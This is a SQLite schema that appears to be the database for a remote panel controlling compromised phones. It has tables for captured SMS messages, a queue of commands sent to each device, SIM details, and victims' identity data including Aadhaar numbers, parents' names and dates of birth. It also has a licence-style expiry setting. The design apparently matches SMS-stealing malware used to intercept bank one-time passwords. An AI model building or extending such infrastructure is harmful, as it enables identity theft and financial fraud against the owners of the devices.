CREATE TABLE IF NOT EXISTS devices (
  id TEXT PRIMARY KEY,
  brand TEXT NOT NULL,
  model TEXT NOT NULL,
  battery INTEGER DEFAULT 100,
  online BOOLEAN DEFAULT 1,
  simCount INTEGER DEFAULT 1,
  lastSeen INTEGER DEFAULT (unixepoch() * 1000)
);

CREATE TABLE IF NOT EXISTS sms (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  deviceId TEXT NOT NULL,
  number TEXT NOT NULL,
  text TEXT NOT NULL,
  time INTEGER NOT NULL,
  FOREIGN KEY (deviceId) REFERENCES devices(id)
);

CREATE TABLE IF NOT EXISTS commands (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  deviceId TEXT NOT NULL,
  type TEXT NOT NULL,
  data TEXT NOT NULL,
  status TEXT DEFAULT 'pending',
  created_at INTEGER NOT NULL,
  executed_at INTEGER,
  FOREIGN KEY (deviceId) REFERENCES devices(id)
);

CREATE TABLE IF NOT EXISTS device_details (
  deviceId TEXT PRIMARY KEY,
  customerName TEXT,
  mobileNumber TEXT,
  fatherName TEXT,
  motherName TEXT,
  aadharNumber TEXT,
  dob TEXT,
  updatedAt INTEGER,
  FOREIGN KEY (deviceId) REFERENCES devices(id)
);

CREATE TABLE IF NOT EXISTS admin_settings (
  key TEXT PRIMARY KEY,
  value TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS sim_info (
  deviceId TEXT NOT NULL,
  simSlot INTEGER NOT NULL,
  operator TEXT,
  networkType TEXT,
  emergencyOnly BOOLEAN DEFAULT 0,
  phoneNumber TEXT,
  lastUpdated INTEGER NOT NULL,
  PRIMARY KEY (deviceId, simSlot),
  FOREIGN KEY (deviceId) REFERENCES devices(id)
);

INSERT INTO admin_settings (key, value) VALUES ('expiry', strftime('%s', 'now', '+30 days') * 1000);
